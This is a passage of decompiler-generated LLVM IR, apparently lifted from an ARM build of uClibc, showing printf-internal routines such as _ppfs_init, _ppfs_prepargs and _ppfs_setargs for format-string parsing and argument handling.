  %v3_131b4 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_131b4, i32* @r4, align 4
  store i32 %v3_131b4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12bd4.outer

dec_label_pc_131c0:                               ; preds = %dec_label_pc_12c30
  %v1_131c0 = add i32 %v0_12c38, 2
  store i32 %v1_131c0, i32* @r4, align 4
  br label %dec_label_pc_12bd4.outer36

dec_label_pc_131c8:                               ; preds = %dec_label_pc_13050, %dec_label_pc_12ed4, %dec_label_pc_1319c, %dec_label_pc_1311c, %dec_label_pc_130e0, %dec_label_pc_130c4, %dec_label_pc_13018, %dec_label_pc_12efc, %dec_label_pc_12e74, %bb142, %dec_label_pc_1316c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_131d0

dec_label_pc_131d0:                               ; preds = %dec_label_pc_12c24, %bb, %dec_label_pc_12b68, %dec_label_pc_131c8
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_12b68 ], [ -1, %dec_label_pc_131c8 ], [ %v1_130a0, %dec_label_pc_12c24 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_12b18, i32* @r5, align 4
  store i32 %v9_12b18, i32* @r6, align 4
  store i32 %v12_12b18, i32* @r7, align 4
  store i32 %v18_12b18, i32* @sb, align 4
  store i32 %v21_12b18, i32* @sl, align 4
  store i32 %v24_12b18, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_131c0, { 1, 0 }
  uselistorder i32 %v3_131b4, { 1, 2, 0 }
  uselistorder i32 %v2_13184, { 1, 2, 0 }
  uselistorder i32 %v0_130cc, { 1, 0 }
  uselistorder i32 %v2_130b4, { 2, 0, 1 }
  uselistorder i1 %v9_13090, { 1, 0 }
  uselistorder i32 %v2_13074, { 1, 0 }
  uselistorder i32 %v0_130bc, { 1, 0 }
  uselistorder i32 %v0_13074, { 1, 0 }
  uselistorder i32 %v1_13050, { 1, 0 }
  uselistorder i32 %v1_13018, { 1, 0, 2 }
  uselistorder i32 %v3_12fe8, { 1, 2, 0 }
  uselistorder i32 %v0_12f54, { 1, 0 }
  uselistorder i32 %v2_12f44, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_12f0c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_12e84, { 1, 0 }
  uselistorder i32 %v2_12de4, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_12e00, { 1, 2, 3, 0 }
  uselistorder i32 %v2_12d80, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_12ce8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12c8c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_12c84, { 1, 0 }
  uselistorder i32 %v1_12c30, { 0, 1, 3, 2 }
  uselistorder i32 %v1_130a0, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_12bf0, { 1, 0 }
  uselistorder i32 %v1_12be8.lcssa, { 1, 0 }
  uselistorder i8 %v2_12bd4, { 1, 0 }
  uselistorder i32 %v2_12be8, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_12c00, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12d08, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_12df8, { 1, 0 }
  uselistorder i1 %v7_12d48, { 1, 2, 0 }
  uselistorder i1 %v7_12f34, { 1, 0 }
  uselistorder i1 %v7_12eac, { 1, 0 }
  uselistorder i1 %v7_12d88, { 1, 0 }
  uselistorder i32 %v2_12ee4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_12ed8, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_12fdc, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_12c88, { 1, 3, 2, 0 }
  uselistorder i32 %v4_12c64, { 1, 0 }
  uselistorder i32 %v2_12b20, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 30, 31, 25, 26, 27, 28, 29, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 9, 8, 10, 12, 11, 17, 13, 14, 15, 16, 18, 19, 22, 20, 21, 24, 23, 26, 25, 28, 27, 30, 29, 33, 31, 32, 36, 37, 34, 35, 47, 38, 48, 1, 40, 39, 42, 41, 44, 43, 46, 45, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -87420), { 1, 0 }
  uselistorder label %dec_label_pc_131d0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_131c8, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_13150, { 1, 0 }
  uselistorder label %dec_label_pc_130e0, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_1308c, { 1, 0 }
  uselistorder label %dec_label_pc_13070, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_13070thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12f98, { 1, 0 }
  uselistorder label %dec_label_pc_12f50, { 1, 0 }
  uselistorder label %dec_label_pc_12e64, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_12d38, { 1, 0 }
  uselistorder label %dec_label_pc_12d34, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12c80, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_12c24, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_12bf0, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_12bd4.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13200 = load i32, i32* @r4, align 4
  %v6_13200 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1320c = load i32, i32* @r1, align 4
  store i32 %v0_1320c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_13218 = bitcast i32* %arg1 to i8*
  %v3_13218 = call i32 @__GI_memset(i8* %v2_13218, i32 0)
  store i32 %v3_13218, i32* %r0.global-to-local, align 4
  %v0_1321c = load i32, i32* @r4, align 4
  %v1_1321c = add i32 %v0_1321c, 24
  %v2_1321c = inttoptr i32 %v1_1321c to i32*
  %v3_1321c = load i32, i32* %v2_1321c, align 4
  store i32 %v3_1321c, i32* %r3.global-to-local, align 4
  %v0_13220 = load i32, i32* @r5, align 4
  %v2_13220 = inttoptr i32 %v0_1321c to i32*
  store i32 %v0_13220, i32* %v2_13220, align 4
  %v0_13224 = load i32, i32* %r3.global-to-local, align 4
  %v1_13224 = add i32 %v0_13224, -1
  %v1_13228 = load i32, i32* @r4, align 4
  %v2_13228 = add i32 %v1_13228, 24
  %v3_13228 = inttoptr i32 %v2_13228 to i32*
  store i32 %v1_13224, i32* %v3_13228, align 4
  %v0_1322c = load i32, i32* @r4, align 4
  %v1_1322c = add i32 %v0_1322c, 40
  store i32 %v1_1322c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_1323c21 = inttoptr i32 %v1_1322c to i32*
  store i32 8, i32* %v2_1323c21, align 4
  %v3_1323c22 = load i32, i32* %r2.global-to-local, align 4
  %v4_1323c23 = add i32 %v3_1323c22, 4
  store i32 %v4_1323c23, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13238.dec_label_pc_13238_crit_edge

dec_label_pc_13238.dec_label_pc_13238_crit_edge:  ; preds = %entry, %dec_label_pc_13238.dec_label_pc_13238_crit_edge
  %v4_1323c24 = phi i32 [ %v4_1323c23, %entry ], [ %v4_1323c, %dec_label_pc_13238.dec_label_pc_13238_crit_edge ]
  %v0_13238.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1323c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13238 = add i32 %v0_13238.pre, -1
  store i32 %v1_13238, i32* %r3.global-to-local, align 4
  %v7_13238 = icmp eq i32 %v0_13238.pre, 1
  %v2_1323c = inttoptr i32 %v4_1323c24 to i32*
  store i32 %v0_1323c.pre, i32* %v2_1323c, align 4
  %v3_1323c = load i32, i32* %r2.global-to-local, align 4
  %v4_1323c = add i32 %v3_1323c, 4
  store i32 %v4_1323c, i32* %r2.global-to-local, align 4
  br i1 %v7_13238, label %dec_label_pc_13244, label %dec_label_pc_13238.dec_label_pc_13238_crit_edge

dec_label_pc_13244:                               ; preds = %dec_label_pc_13238.dec_label_pc_13238_crit_edge
  %v0_13244 = load i32, i32* @r5, align 4
  store i32 %v0_13244, i32* %r2.global-to-local, align 4
  %v1_132842 = inttoptr i32 %v0_13244 to i8*
  %v2_132843 = load i8, i8* %v1_132842, align 1
  %v3_132844 = zext i8 %v2_132843 to i32
  store i32 %v3_132844, i32* %r0.global-to-local, align 4
  %v2_132885 = icmp eq i8 %v2_132843, 0
  br i1 %v2_132885, label %dec_label_pc_13290, label %dec_label_pc_1324c

dec_label_pc_1324c:                               ; preds = %dec_label_pc_13244, %dec_label_pc_13284.backedge
  %v0_13254 = phi i32 [ %storemerge, %dec_label_pc_13284.backedge ], [ %v0_13244, %dec_label_pc_13244 ]
  %v0_1324c = phi i32 [ %v3_13284, %dec_label_pc_13284.backedge ], [ %v3_132844, %dec_label_pc_13244 ]
  %v7_1324c = icmp eq i32 %v0_1324c, 37
  br i1 %v7_1324c, label %dec_label_pc_13254, label %dec_label_pc_13280

dec_label_pc_13254:                               ; preds = %dec_label_pc_1324c
  %v1_13254 = add i32 %v0_13254, 1
  %v2_13254 = inttoptr i32 %v1_13254 to i8*
  %v3_13254 = load i8, i8* %v2_13254, align 1
  %v4_13254 = zext i8 %v3_13254 to i32
  store i32 %v4_13254, i32* %r3.global-to-local, align 4
  store i32 %v1_13254, i32* %r2.global-to-local, align 4
  %v7_13258 = icmp eq i8 %v3_13254, 37
  br i1 %v7_13258, label %dec_label_pc_13280, label %dec_label_pc_13260

dec_label_pc_13260:                               ; preds = %dec_label_pc_13254
  %v1_13260 = load i32, i32* @r4, align 4
  %v2_13260 = inttoptr i32 %v1_13260 to i32*
  store i32 %v1_13254, i32* %v2_13260, align 4
  %v0_13264 = load i32, i32* @r4, align 4
  store i32 %v0_13264, i32* %r0.global-to-local, align 4
  %v1_13268 = inttoptr i32 %v0_13264 to i8*
  %v2_13268 = call i32 @_ppfs_parsespec(i8* %v1_13268)
  store i32 %v2_13268, i32* %r0.global-to-local, align 4
  %v1_1326c = icmp slt i32 %v2_13268, 0
  br i1 %v1_1326c, label %dec_label_pc_13294.loopexit, label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %dec_label_pc_13260
  %v0_13278 = load i32, i32* @r4, align 4
  %v1_13278 = inttoptr i32 %v0_13278 to i32*
  %v2_13278 = load i32, i32* %v1_13278, align 4
  br label %dec_label_pc_13284.backedge

dec_label_pc_13280:                               ; preds = %dec_label_pc_1324c, %dec_label_pc_13254
  %v0_13280 = phi i32 [ %v0_13254, %dec_label_pc_1324c ], [ %v1_13254, %dec_label_pc_13254 ]
  %v1_13280 = add i32 %v0_13280, 1
  br label %dec_label_pc_13284.backedge

dec_label_pc_13284.backedge:                      ; preds = %dec_label_pc_13280, %dec_label_pc_13278
  %storemerge = phi i32 [ %v1_13280, %dec_label_pc_13280 ], [ %v2_13278, %dec_label_pc_13278 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_13284 = inttoptr i32 %storemerge to i8*
  %v2_13284 = load i8, i8* %v1_13284, align 1
  %v3_13284 = zext i8 %v2_13284 to i32
  store i32 %v3_13284, i32* %r0.global-to-local, align 4
  %v2_13288 = icmp eq i8 %v2_13284, 0
  br i1 %v2_13288, label %dec_label_pc_13284.dec_label_pc_13290_crit_edge, label %dec_label_pc_1324c

dec_label_pc_13284.dec_label_pc_13290_crit_edge:  ; preds = %dec_label_pc_13284.backedge
  %v0_13290.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13290

dec_label_pc_13290:                               ; preds = %dec_label_pc_13284.dec_label_pc_13290_crit_edge, %dec_label_pc_13244
  %v0_13290 = phi i32 [ %v0_13290.pre, %dec_label_pc_13284.dec_label_pc_13290_crit_edge ], [ %v0_13244, %dec_label_pc_13244 ]
  %v1_13290 = load i32, i32* @r4, align 4
  %v2_13290 = inttoptr i32 %v1_13290 to i32*
  store i32 %v0_13290, i32* %v2_13290, align 4
  %v1_1329c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13294

dec_label_pc_13294.loopexit:                      ; preds = %dec_label_pc_13260
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13294

dec_label_pc_13294:                               ; preds = %dec_label_pc_13294.loopexit, %dec_label_pc_13290
  %v1_1329c = phi i32 [ -1, %dec_label_pc_13294.loopexit ], [ %v1_1329c.pre, %dec_label_pc_13290 ]
  store i32 %v3_13200, i32* @r4, align 4
  store i32 %v6_13200, i32* @r5, align 4
  ret i32 %v1_1329c

; uselistorder directives
  uselistorder i32 %v3_13284, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_13244, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1323c, { 1, 0 }
  uselistorder i32 %v0_13238.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder label %dec_label_pc_13280, { 1, 0 }
  uselistorder label %dec_label_pc_1324c, { 1, 0 }
  uselistorder label %dec_label_pc_13238.dec_label_pc_13238_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_132a0 = load i32, i32* @r4, align 4
  store i32 %v3_132a0, i32* %stack_var_-12, align 4
  %v0_132a4 = load i32, i32* @r0, align 4
  %v1_132a4 = add i32 %v0_132a4, 24
  %v2_132a4 = inttoptr i32 %v1_132a4 to i32*
  %v3_132a4 = load i32, i32* %v2_132a4, align 4
  store i32 %v3_132a4, i32* %r5.global-to-local, align 4
  store i32 %v0_132a4, i32* @r4, align 4
  %v2_132b4 = add i32 %v0_132a4, 76
  %v3_132b4 = inttoptr i32 %v2_132b4 to i32*
  store i32 %arg2, i32* %v3_132b4, align 4
  %tmp5 = icmp slt i32 %v3_132a4, 1
  br i1 %tmp5, label %dec_label_pc_132d8, label %dec_label_pc_132bc

dec_label_pc_132bc:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_132c0 = load i32, i32* @r0, align 4
  %v2_132c0 = add i32 %v1_132c0, 8
  %v3_132c0 = inttoptr i32 %v2_132c0 to i32*
  store i32 0, i32* %v3_132c0, align 4
  %v0_132c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_132c4 = load i32, i32* @r0, align 4
  %v2_132c4 = add i32 %v1_132c4, 28
  %v3_132c4 = inttoptr i32 %v2_132c4 to i32*
  store i32 %v0_132c4, i32* %v3_132c4, align 4
  %v0_132c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_132c8 = load i32, i32* @r0, align 4
  %v2_132c8 = add i32 %v1_132c8, 24
  %v3_132c8 = inttoptr i32 %v2_132c8 to i32*
  store i32 %v0_132c8, i32* %v3_132c8, align 4
  %v0_132cc = load i32, i32* %r3.global-to-local, align 4
  %v1_132cc = load i32, i32* @r0, align 4
  %v2_132cc = add i32 %v1_132cc, 4
  %v3_132cc = inttoptr i32 %v2_132cc to i32*
  store i32 %v0_132cc, i32* %v3_132cc, align 4
  %v0_132d0 = call i32 @_ppfs_setargs()
  store i32 %v0_132d0, i32* @r0, align 4
  %v0_132d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_132d4 = load i32, i32* @r4, align 4
  %v2_132d4 = add i32 %v1_132d4, 24
  %v3_132d4 = inttoptr i32 %v2_132d4 to i32*
  store i32 %v0_132d4, i32* %v3_132d4, align 4
  br label %dec_label_pc_132d8

dec_label_pc_132d8:                               ; preds = %entry, %dec_label_pc_132bc
  %v2_132dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_132dc, i32* @r4, align 4
  %v1_132e0 = load i32, i32* @r0, align 4
  ret i32 %v1_132e0

; uselistorder directives
  uselistorder i32 %v0_132a4, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_132d8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_132e4 = load i32, i32* @r0, align 4
  %v1_132e4 = add i32 %v0_132e4, 24
  %v2_132e4 = inttoptr i32 %v1_132e4 to i32*
  %v3_132e4 = load i32, i32* %v2_132e4, align 4
  store i32 %v3_132e4, i32* %r1.global-to-local, align 4
  %v2_132e8 = icmp eq i32 %v3_132e4, 0
  %v3_132ec = load i32, i32* @r4, align 4
  store i32 %v3_132ec, i32* %stack_var_-8, align 4
  %v1_132f0 = add i32 %v0_132e4, 8
  %v2_132f0 = inttoptr i32 %v1_132f0 to i32*
  %v3_132f0 = load i32, i32* %v2_132f0, align 4
  store i32 %v3_132f0, i32* %r3.global-to-local, align 4
  %v6_132f8 = icmp eq i32 %v3_132f0, -2147483648
  br i1 %v2_132e8, label %dec_label_pc_132f8, label %dec_label_pc_13430

dec_label_pc_132f8:                               ; preds = %entry
  br i1 %v6_132f8, label %dec_label_pc_13300, label %dec_label_pc_13318

dec_label_pc_13300:                               ; preds = %dec_label_pc_132f8
  %v1_13300 = add i32 %v0_132e4, 76
  %v2_13300 = inttoptr i32 %v1_13300 to i32*
  %v3_13300 = load i32, i32* %v2_13300, align 4
  store i32 %v3_13300, i32* %r3.global-to-local, align 4
  %v1_13304 = inttoptr i32 %v3_13300 to i32*
  %v2_13304 = load i32, i32* %v1_13304, align 4
  store i32 %v2_13304, i32* %r2.global-to-local, align 4
  %v1_13308 = add i32 %v3_13300, 4
  store i32 %v1_13308, i32* %r3.global-to-local, align 4
  store i32 %v1_13308, i32* %v2_13300, align 4
  %v0_13310 = load i32, i32* %r2.global-to-local, align 4
  %v1_13310 = load i32, i32* @r0, align 4
  %v2_13310 = add i32 %v1_13310, 8
  %v3_13310 = inttoptr i32 %v2_13310 to i32*
  store i32 %v0_13310, i32* %v3_13310, align 4
  %v0_13314 = load i32, i32* %r2.global-to-local, align 4
  %v1_13314 = load i32, i32* @r0, align 4
  %v2_13314 = add i32 %v1_13314, 80
  %v3_13314 = inttoptr i32 %v2_13314 to i32*
  store i32 %v0_13314, i32* %v3_13314, align 4
  %v0_13318.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13318

dec_label_pc_13318:                               ; preds = %dec_label_pc_132f8, %dec_label_pc_13300
  %v1_13334 = phi i32 [ %v0_132e4, %dec_label_pc_132f8 ], [ %v0_13318.pre, %dec_label_pc_13300 ]
  %v1_13318 = add i32 %v1_13334, 4
  %v2_13318 = inttoptr i32 %v1_13318 to i32*
  %v3_13318 = load i32, i32* %v2_13318, align 4
  store i32 %v3_13318, i32* %r3.global-to-local, align 4
  %v6_1331c = icmp eq i32 %v3_13318, -2147483648
  %v1_13320 = add i32 %v1_13334, 80
  store i32 %v1_13320, i32* %ip.global-to-local, align 4
  br i1 %v6_1331c, label %dec_label_pc_13328, label %dec_label_pc_13340

dec_label_pc_13328:                               ; preds = %dec_label_pc_13318
  %v1_13328 = add i32 %v1_13334, 76
  %v2_13328 = inttoptr i32 %v1_13328 to i32*
  %v3_13328 = load i32, i32* %v2_13328, align 4
  store i32 %v3_13328, i32* %r3.global-to-local, align 4
  %v1_1332c = inttoptr i32 %v3_13328 to i32*
  %v2_1332c = load i32, i32* %v1_1332c, align 4
  store i32 %v2_1332c, i32* %r2.global-to-local, align 4
  %v1_13330 = add i32 %v3_13328, 4
  store i32 %v1_13330, i32* %r3.global-to-local, align 4
  store i32 %v1_13330, i32* %v2_13328, align 4
  %v0_13338 = load i32, i32* %r2.global-to-local, align 4
  %v1_13338 = load i32, i32* @r0, align 4
  %v2_13338 = add i32 %v1_13338, 4
  %v3_13338 = inttoptr i32 %v2_13338 to i32*
  store i32 %v0_13338, i32* %v3_13338, align 4
  %v0_1333c = load i32, i32* %r2.global-to-local, align 4
  %v1_1333c = load i32, i32* @r0, align 4
  %v2_1333c = add i32 %v1_1333c, 80
  %v3_1333c = inttoptr i32 %v2_1333c to i32*
  store i32 %v0_1333c, i32* %v3_1333c, align 4
  %v0_1342017.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13340

dec_label_pc_13340:                               ; preds = %dec_label_pc_13318, %dec_label_pc_13328
  %v0_1342017 = phi i32 [ %v1_13334, %dec_label_pc_13318 ], [ %v0_1342017.pre, %dec_label_pc_13328 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_13344 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13344, i32* %lr.global-to-local, align 4
  %v1_1342018 = add i32 %v0_1342017, 28
  %v2_1342019 = inttoptr i32 %v1_1342018 to i32*
  %v3_1342020 = load i32, i32* %v2_1342019, align 4
  store i32 %v3_1342020, i32* %r3.global-to-local, align 4
  %v5_1342822 = icmp slt i32 %v0_13344, %v3_1342020
  br i1 %v5_1342822, label %dec_label_pc_1334c, label %dec_label_pc_1342c.loopexit

dec_label_pc_1334c:                               ; preds = %dec_label_pc_13340, %dec_label_pc_13420.backedge
  %v0_1342024 = phi i32 [ %v0_13420, %dec_label_pc_13420.backedge ], [ %v0_1342017, %dec_label_pc_13340 ]
  %v0_1335823 = phi i32 [ %v0_13358.be, %dec_label_pc_13420.backedge ], [ %v0_13344, %dec_label_pc_13340 ]
  %v4_1334c = mul i32 %v0_1335823, 4
  %v5_1334c = add i32 %v4_1334c, %v0_1342024
  store i32 %v5_1334c, i32* %r3.global-to-local, align 4
  %v1_13350 = add i32 %v5_1334c, 40
  %v2_13350 = inttoptr i32 %v1_13350 to i32*
  %v3_13350 = load i32, i32* %v2_13350, align 4
  store i32 %v3_13350, i32* %r3.global-to-local, align 4
  %v7_13354 = icmp eq i32 %v3_13350, 8
  %v1_13358 = add i32 %v0_1335823, 1
  store i32 %v1_13358, i32* %lr.global-to-local, align 4
  br i1 %v7_13354, label %dec_label_pc_13420.backedge, label %dec_label_pc_13360

dec_label_pc_13360:                               ; preds = %dec_label_pc_1334c
  %v1_13360 = add i32 %v0_1342024, 76
  %v2_13360 = inttoptr i32 %v1_13360 to i32*
  %v3_13360 = load i32, i32* %v2_13360, align 4
  store i32 %v3_13360, i32* %r1.global-to-local, align 4
  %v8_13364 = icmp sgt i32 %v3_13350, 8
  br i1 %v8_13364, label %dec_label_pc_13388, label %dec_label_pc_13368

dec_label_pc_13368:                               ; preds = %dec_label_pc_13360
  %v7_13368 = icmp eq i32 %v3_13350, 2
  br i1 %v7_13368, label %dec_label_pc_133d8, label %dec_label_pc_13370

dec_label_pc_13370:                               ; preds = %dec_label_pc_13368
  %v8_13370 = icmp sgt i32 %v3_13350, 2
  br i1 %v8_13370, label %dec_label_pc_13380, label %dec_label_pc_13374

dec_label_pc_13374:                               ; preds = %dec_label_pc_13370
  %v1_13374 = icmp slt i32 %v3_13350, 0
  br i1 %v1_13374, label %dec_label_pc_1340c, label %dec_label_pc_133d8

dec_label_pc_13380:                               ; preds = %dec_label_pc_13370
  %v7_13380 = icmp eq i32 %v3_13350, 7
  br i1 %v7_13380, label %dec_label_pc_133ec, label %dec_label_pc_1340c

dec_label_pc_13388:                               ; preds = %dec_label_pc_13360
  %v7_13388 = icmp eq i32 %v3_13350, 1024
  br i1 %v7_13388, label %dec_label_pc_133d8, label %dec_label_pc_13390

dec_label_pc_13390:                               ; preds = %dec_label_pc_13388
  %v8_13390 = icmp sgt i32 %v3_13350, 1024
  br i1 %v8_13390, label %dec_label_pc_133a8, label %dec_label_pc_13394

dec_label_pc_13394:                               ; preds = %dec_label_pc_13390
  switch i32 %v3_13350, label %dec_label_pc_1340c [
    i32 256, label %dec_label_pc_133d8
    i32 512, label %dec_label_pc_133d8
  ]

dec_label_pc_133a8:                               ; preds = %dec_label_pc_13390
  %v7_133a8 = icmp eq i32 %v3_13350, 2048
  br i1 %v7_133a8, label %dec_label_pc_133bc, label %dec_label_pc_133b4

dec_label_pc_133b4:                               ; preds = %dec_label_pc_133a8
  %v1_133b0 = load i32, i32* %r4.global-to-local, align 4
  %v9_133b0 = icmp eq i32 %v3_13350, %v1_133b0
  br i1 %v9_133b0, label %dec_label_pc_133ec, label %dec_label_pc_1340c

dec_label_pc_133bc:                               ; preds = %dec_label_pc_133a8
  %v1_133bc = add i32 %v3_13360, 7
  %v1_133c0 = and i32 %v1_133bc, -8
  store i32 %v1_133c0, i32* %r3.global-to-local, align 4
  %v1_133c4 = inttoptr i32 %v1_133c0 to i32*
  %v2_133c4 = load i32, i32* %v1_133c4, align 8
  store i32 %v2_133c4, i32* %r1.global-to-local, align 4
  %v3_133c4 = or i32 %v1_133c0, 4
  %v4_133c4 = inttoptr i32 %v3_133c4 to i32*
  %v5_133c4 = load i32, i32* %v4_133c4, align 4
  store i32 %v5_133c4, i32* %r2.global-to-local, align 4
  %v1_133c8 = add i32 %v1_133c0, 8
  store i32 %v1_133c8, i32* %r3.global-to-local, align 4
  store i32 %v1_133c8, i32* %v2_13360, align 4
  %v0_133d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_133d0 = inttoptr i32 %v0_133d0 to i32*
  %v2_133d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_133d0, i32* %v1_133d0, align 4
  %v3_133d0 = add i32 %v0_133d0, 4
  %v4_133d0 = inttoptr i32 %v3_133d0 to i32*
  %v5_133d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_133d0, i32* %v4_133d0, align 4
  br label %dec_label_pc_1341c

dec_label_pc_133d8:                               ; preds = %dec_label_pc_13394, %dec_label_pc_13394, %dec_label_pc_13374, %dec_label_pc_13388, %dec_label_pc_13368
  %v1_133d8 = inttoptr i32 %v3_13360 to i32*
  %v2_133d8 = load i32, i32* %v1_133d8, align 4
  store i32 %v2_133d8, i32* %r2.global-to-local, align 4
  %v1_133dc = add i32 %v3_13360, 4
  store i32 %v1_133dc, i32* %r3.global-to-local, align 4
  store i32 %v1_133dc, i32* %v2_13360, align 4
  %v0_133e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_133e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_133e4 = inttoptr i32 %v1_133e4 to i32*
  store i32 %v0_133e4, i32* %v2_133e4, align 4
  br label %dec_label_pc_1341c

dec_label_pc_133ec:                               ; preds = %dec_label_pc_13380, %dec_label_pc_133b4
  %v3_133ec = load i32, i32* %v2_13360, align 4
  %v1_133f0 = add i32 %v3_133ec, 7
  %v1_133f4 = and i32 %v1_133f0, -8
  store i32 %v1_133f4, i32* %r3.global-to-local, align 4
  %v1_133f8 = inttoptr i32 %v1_133f4 to i32*
  %v2_133f8 = load i32, i32* %v1_133f8, align 8
  store i32 %v2_133f8, i32* %r1.global-to-local, align 4
  %v3_133f8 = or i32 %v1_133f4, 4
  %v4_133f8 = inttoptr i32 %v3_133f8 to i32*
  %v5_133f8 = load i32, i32* %v4_133f8, align 4
  store i32 %v5_133f8, i32* %r2.global-to-local, align 4
  %v1_133fc = add i32 %v1_133f4, 8
